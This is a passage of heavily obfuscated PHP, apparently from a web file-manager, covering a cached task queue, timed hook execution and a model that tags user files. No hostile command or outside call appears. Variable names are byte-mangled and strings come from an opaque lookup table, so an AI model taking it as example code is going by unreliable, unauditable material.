$¸†ÎáÚä[1795]; if ($ê»§òİ› && is_string($ê»§òİ›)) { $Èş¡šÉù = $Èş¡šÉù . $¸†ÎáÚä[1879] . $ê»§òİ›; } write_log($¸†ÎáÚä[1880] . $°÷§ ­€[$¸†ÎáÚä[510]] . $¸†ÎáÚä[1881] . $Èş¡šÉù, $¸†ÎáÚä[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $¦ºüÛú =& $_SERVER[÷åé¼î]; $ÚÏÃ¨—ó = self::threadCount() + 1; if ($ÚÏÃ¨—ó > 3 || !self::count()) { return; } write_log($¦ºüÛú[1882] . $ÚÏÃ¨—ó, $¦ºüÛú[197]); Cache::set(self::QUEUE_THREAD, $ÚÏÃ¨—ó, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($¦ºüÛú[1883], $¦ºüÛú[197]); } public static function getKey($©’ÒÊÖ², $…£™ÄÄ¼ = "\151\x6e\164") { $ˆË²‚ª =& $_SERVER[÷åé¼î]; Cache::removeMemory($©’ÒÊÖ²); $ŠŸÑ® = Cache::get($©’ÒÊÖ²); if ($…£™ÄÄ¼ == $ˆË²‚ª[348]) { return $ŠŸÑ® ? intval($ŠŸÑ®) : 0; } if ($…£™ÄÄ¼ == $ˆË²‚ª[1884]) { return is_array($ŠŸÑ®) ? $ŠŸÑ® : array(); } return $ŠŸÑ®; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[÷åé¼î][1884]); } public static function setAll($œÈËìŠ‚) { $æÏ¨ªÜ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($œÈËìŠ‚), $æÏ¨ªÜ); Cache::set(self::QUEUE_DATA, $œÈËìŠ‚, $æÏ¨ªÜ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($½¤·ùî‘, $ì¨”Íœ = 5.0) { if (!$½¤·ùî‘) { return; } $…îšÍ–ö = Cache::get($½¤·ùî‘); if (!$…îšÍ–ö || timeFloat() - floatVal($…îšÍ–ö) >= $ì¨”Íœ) { Cache::set($½¤·ùî‘, timeFloat(), $ì¨”Íœ * 10); return !0; } return !1; } public static function timeLimitCall($ô†™¹˜, $¿˜±¶³é, $¡ã†ƒû®, $Ù©Èô«Ö = 5.0) { $ôŠÓÎ€  =& $_SERVER[÷åé¼î]; if (!$ô†™¹˜ || !$¿˜±¶³é) { return; } self::$asyncAdd = !0; $ÃÄ¸Óàõ = $ôŠÓÎ€ [1885]; $î‚ÔšñÚ = Cache::get($ÃÄ¸Óàõ, !0); $Ï¤–¿üå = array($ôŠÓÎ€ [1886] => timeFloat(), $ôŠÓÎ€ [1887] => timeFloat(), $ôŠÓÎ€ [325] => $¿˜±¶³é, $ôŠÓÎ€ [1877] => $¡ã†ƒû®, $ôŠÓÎ€ [206] => $Ù©Èô«Ö); if (is_array($î‚ÔšñÚ[$ô†™¹˜])) { $Ï¤–¿üå[$ôŠÓÎ€ [1887]] = $î‚ÔšñÚ[$ô†™¹˜][$ôŠÓÎ€ [1887]]; } if (is_array($î‚ÔšñÚ[$ô†™¹˜])) { if (timeFloat() - $î‚ÔšñÚ[$ô†™¹˜][$ôŠÓÎ€ [1886]] < $Ï¤–¿üå[$ôŠÓÎ€ [206]] * 0.3) { return; } $Ï¤–¿üå[$ôŠÓÎ€ [1887]] = $î‚ÔšñÚ[$ô†™¹˜][$ôŠÓÎ€ [1887]]; } $î‚ÔšñÚ[$ô†™¹˜] = $Ï¤–¿üå; Cache::set($ÃÄ¸Óàõ, $î‚ÔšñÚ, 60); Cache::removeMemory($ÃÄ¸Óàõ); write_log($ôŠÓÎ€ [1888] . $ô†™¹˜ . $ôŠÓÎ€ [74] . $¿˜±¶³é, $ôŠÓÎ€ [197]); } public static function timeLimitCallLoop() { $™¬Õåç´ =& $_SERVER[÷åé¼î]; $²¥—»Ñ¡ = array($™¬Õåç´[1889]); $ÊëÊÎŒş = in_array(strtolower(ACTION), $²¥—»Ñ¡); if (!$ÊëÊÎŒş && !self::$asyncAdd) { return; } $š¯ä÷õ = $™¬Õåç´[1885]; $Ä–øÙ×æ = Cache::get($š¯ä÷õ, !0); if (!$Ä–øÙ×æ || count($Ä–øÙ×æ) <= 0) { return; } $ÚÆ™³ˆ– = !1; $û–—¡‰ = timeFloat(); $İ‹ª”¹ = array(); foreach ($Ä–øÙ×æ as $­Ü¢Ç²” => $ªı‰ÅÈ×) { if ($û–—¡‰ - $ªı‰ÅÈ×[$™¬Õåç´[1887]] > $ªı‰ÅÈ×[$™¬Õåç´[206]]) { $ÚÆ™³ˆ– = !0; try { Hook::apply($ªı‰ÅÈ×[$™¬Õåç´[325]], $ªı‰ÅÈ×[$™¬Õåç´[1877]]); write_log($™¬Õåç´[1890] . $­Ü¢Ç²” . $™¬Õåç´[74] . $ªı‰ÅÈ×[$™¬Õåç´[325]] . $™¬Õåç´[1891] . ACTION, $™¬Õåç´[197]); } catch (Exception $¸¥¢ó÷Ï) { } continue; } $İ‹ª”¹[$­Ü¢Ç²”] = $ªı‰ÅÈ×; } if (!$ÚÆ™³ˆ–) { return; } if (!$İ‹ª”¹) { return Cache::remove($š¯ä÷õ); } Cache::set($š¯ä÷õ, $İ‹ª”¹, 60); Cache::removeMemory($š¯ä÷õ); } public static function finished($›Ê‚Ë¹, $Ï­ÂÆ¨İ) { $€ŠÖÚ•ô =& $_SERVER[÷åé¼î]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($€ŠÖÚ•ô[325] => $›Ê‚Ë¹, $€ŠÖÚ•ô[1877] => $Ï­ÂÆ¨İ); } private static function finishedRun() { $ã¦ˆÙ½‚ =& $_SERVER[÷åé¼î]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Óó³¸) { try { Hook::apply($Óó³¸[$ã¦ˆÙ½‚[325]], $Óó³¸[$ã¦ˆÙ½‚[1877]]); } catch (Exception $®İéºÏÃ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto FĞô‰ã«Ô; c¨‚ôæ¤: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\166"; protected function cacheFunctionAlias($ÎâëªÂÁ) { $—§²®ø =& $_SERVER[÷åé¼î]; return array($—§²®ø[2092] => array($—§²®ø[2507] . USER_ID, $—§²®ø[2093])); } protected function listData() { $™­¯ƒİé =& $_SERVER[÷åé¼î]; $Ä£õÛ˜ = array($™­¯ƒİé[1770] => USER_ID, $™­¯ƒİé[541] => array($™­¯ƒİé[2096], 0)); $êÑ‘—†Ú = $™­¯ƒİé[2508]; $ÓÌ¹ßÔÔ = $this->field($êÑ‘—†Ú)->where($Ä£õÛ˜)->order($™­¯ƒİé[2099])->select(); return $ÓÌ¹ßÔÔ ? $ÓÌ¹ßÔÔ : array(); } protected function addToTag($Î‚Èï«, $ì ¯¿ÕÍ) { $±œØ×Ë“ =& $_SERVER[÷åé¼î]; if (!Model($±œØ×Ë“[2243])->listData($ì ¯¿ÕÍ)) { return !1; } if (is_numeric($Î‚Èï«)) { $ –‹­¯¢ = Model($±œØ×Ë“[889])->pathInfo($Î‚Èï«); if (!$ –‹­¯¢) { return !1; } } else { $ –‹­¯¢ = IO::infoSimple($Î‚Èï«); if (!$ –‹­¯¢) { return !1; } $’¡™„Öó = $ –‹­¯¢[$±œØ×Ë“[32]]; $ùŞ²àÇ = $ –‹­¯¢[$±œØ×Ë“[33]]; if (isset($ –‹­¯¢[$±œØ×Ë“[469]])) { $ùŞ²àÇ = $ –‹­¯¢[$±œØ×Ë“[469]] == $±œØ×Ë“[91] ? $±œØ×Ë“[78] : $±œØ×Ë“[230]; } } $ûê§Å¨ = array($±œØ×Ë“[1770] => USER_ID, $±œØ×Ë“[541] => $ì ¯¿ÕÍ, $±œØ×Ë“[479] => $Î‚Èï«, $±œØ×Ë“[480] => $ùŞ²àÇ ? $ùŞ²àÇ : $±œØ×Ë“[474], $±œØ×Ë“[478] => $’¡™„Öó ? $’¡™„Öó : $±œØ×Ë“[12], $±œØ×Ë“[1981] => 0); if ($this->where($ûê§Å¨)->find()) { return !1; } return $this->add($ûê§Å¨); } protected function removeFromTag($ªÎÌ”•¶, $¢™Ê™Õ) { $ÀÄ®«ş¨ =& $_SERVER[÷åé¼î]; if (!Model($ÀÄ®«ş¨[2243])->listData($¢™Ê™Õ)) { return !1; } if (is_array($ªÎÌ”•¶)) { $ªÎÌ”•¶ = array($ÀÄ®«ş¨[7], $ªÎÌ”•¶); } $İ©ìÓ‘¹ = array($ÀÄ®«ş¨[1770] => USER_ID, $ÀÄ®«ş¨[541] => $¢™Ê™Õ, $ÀÄ®«ş¨[479] => $ªÎÌ”•¶); return $this->where($İ©ìÓ‘¹)->delete(); } protected function removeByTag($†˜ßöõŸ) { $íŸÈÚÕœ =& $_SERVER[÷åé¼î]; if (!$†˜ßöõŸ) { return !1; } $Æ£Äâ—– = array($íŸÈÚÕœ[1770] => USER_ID, $íŸÈÚÕœ[541] => $†˜ßöõŸ); return $this->where($Æ£Äâ—–)->delete(); } protected function removeBySource($şÇ¨«ÜÊ) { $ÅÏ«—Ë– =& $_SERVER[÷åé¼î]; if (is_array($şÇ¨«ÜÊ)) { $şÇ¨«ÜÊ = array($ÅÏ«—Ë–[7], $şÇ¨«ÜÊ); } $÷“‹×’ë = array($ÅÏ«—Ë–[1770] => USER_ID, $ÅÏ«—Ë–[541] => array($ÅÏ«—Ë–[1086], 0), $ÅÏ«—Ë–[479] => $şÇ¨«ÜÊ); return $this->where($÷“‹×’ë)->delete(); } }